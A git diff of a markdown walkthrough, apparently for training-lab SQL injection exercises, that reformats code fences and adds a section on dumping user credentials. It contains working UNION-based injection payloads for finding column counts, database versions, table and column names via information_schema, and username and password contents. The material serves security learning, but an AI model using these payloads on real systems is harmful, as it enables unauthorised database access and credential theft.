@@ -97,7 +97,7 @@ WHERE username = 'administrator'-- '
   AND password = 'test123';
 ```
 
-#### Lab 03: SQL injection attack, querying the database type and version on Oracle
+### Lab 03: SQL injection attack, querying the database type and version on Oracle
 
 > This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
 >
@@ -125,13 +125,13 @@ Therefore, we must determine:
 - Which data types we can inject.
 
 A common way to check column count is:
-```
+```sql
 ' UNION SELECT null--
 ```
 <img width="1396" height="745" alt="image" src="https://github.com/user-attachments/assets/bf687aaa-7611-499e-9656-4d683022914f" />
 
 However, Oracle requires a FROM clause. To resolve this, we query from Oracle’s built-table which is `dual`:
-```
+```sql
 ' UNION SELECT null from dual--
 ```
 <img width="1365" height="622" alt="image" src="https://github.com/user-attachments/assets/bc2794f9-23c2-42eb-8caf-bee8a418ae56" />
@@ -139,7 +139,7 @@ However, Oracle requires a FROM clause. To resolve this, we query from Oracle’
 Still gives an error? It is likely column count mismatch.
 
 Next, try two columns:
-```
+```sql
 ' UNION SELECT null, null from dual--
 ```
 This time the page loads successfully, meaning the original query returns 2 columns.
@@ -147,7 +147,7 @@ This time the page loads successfully, meaning the original query returns 2 colu
 <img width="1405" height="538" alt="image" src="https://github.com/user-attachments/assets/74d8cf0e-2f70-45e4-9fee-02a20fdff42f" />
 
 We can query two columns from the table, but we must ensure the data types match the original query’s expected column types. If we try to inject a value with the wrong data type, Oracle will return an error. For example:
-```
+```sql
 ' UNION SELECT 'A', 1 FROM dual--
 ```
 <img width="1347" height="490" alt="image" src="https://github.com/user-attachments/assets/a3971501-20b3-4920-93d4-b05415a4c2be" />
@@ -155,7 +155,7 @@ We can query two columns from the table, but we must ensure the data types match
 This results in an error because one of the columns expects a string, but we supplied an integer.
 
 To verify the correct data types, we replace the integer with either a string or NULL. Since the following payload works without errors, we can conclude that both columns accept string data:
-```
+```sql
 ' UNION SELECT 'A', NULL FROM dual--
 ```
 
@@ -165,7 +165,7 @@ To verify the correct data types, we replace the integer with either a string or
 Since the description already states the DB is Oracle, we can use `v$version` table that stores version information.
 
 The column we need is banner.
-```
+```sql
 ' UNION SELECT banner, null FROM v$version--
 ```
 
@@ -184,19 +184,52 @@ Do the intial testing using quotes and comments. Upon testing, `--` double dash 
 <img width="1399" height="502" alt="image" src="https://github.com/user-attachments/assets/925fca20-1c46-4b73-ba9e-52370b9e0a6a" />
 
 Do the same enumeration for column numbers and data types. Since this is not Oracle, you dont require to include FROM clause to check the column amounts.
-```
+```sql
 ' UNION SELECT null,null#
 ```
 
 Same as previous lab, we have 2 columns. Both of columns will return string.
-```
+```sql
 ' UNION SELECT '1','2'#
 ```
 <img width="1386" height="709" alt="image" src="https://github.com/user-attachments/assets/a2b4c0a7-8745-4da3-ba86-853c2a7a51cc" />
 
 ##### Exploitation
 Now, we have all information that we need to craft the payload. We can use `@@version` to display database version for MySQL.
-```
+```sql
 ' UNION SELECT @@version,'2'#
 ```
 <img width="1405" height="738" alt="image" src="https://github.com/user-attachments/assets/20bdc7c9-bd2a-4a36-83aa-8a5e282f0016" />
+
+
+### Lab 05: SQL injection attack, listing the database contents on non-Oracle databases
+
+> The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it
+> contains, then retrieve the contents of the table to obtain the username and password of all users.
+>
+> Goal: Log in as the administrator user.
+
+#### Recon
+The setup is similar to previous labs, so we already know the column required and which database that we are using.
+
+##### Exploitation
+We can see all contents inside the database using `information_schema`, this include any tables and any columns inside a table. We can refer to <a href="https://www.postgresql.org/docs/current/infoschema-tables.html">PostgreSQL documentation</a> for list of available columns inside `information_schema`. 
+
+We can use `table_name` column to see all tables available.
+```sql
+' UNION SELECT table_name,null FROM information_schema.tables--
+```
+<img width="1384" height="583" alt="image" src="https://github.com/user-attachments/assets/239902f7-2115-4509-a31d-61e887af3de4" />
+
+
+There is a table called `users_nflxix`, most probably contains user information. Now, we can query `information_schema.columns` to list out all columns for `users_nflxix` table.
+```sql
+' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users_nflxix'--
+```
+<img width="1419" height="669" alt="image" src="https://github.com/user-attachments/assets/7dd9e589-6f15-4a25-be54-7ac4c8d2e0f1" />
+
+List out all username and password from `users_nflxix`.
+```sql
+' UNION SELECT username_deyvdc,password_bebcvo FROM users_nflxix-- 
+```
+<img width="1384" height="706" alt="image" src="https://github.com/user-attachments/assets/c2ec2185-7a5f-4c1e-b0d9-9747ec86d626" />
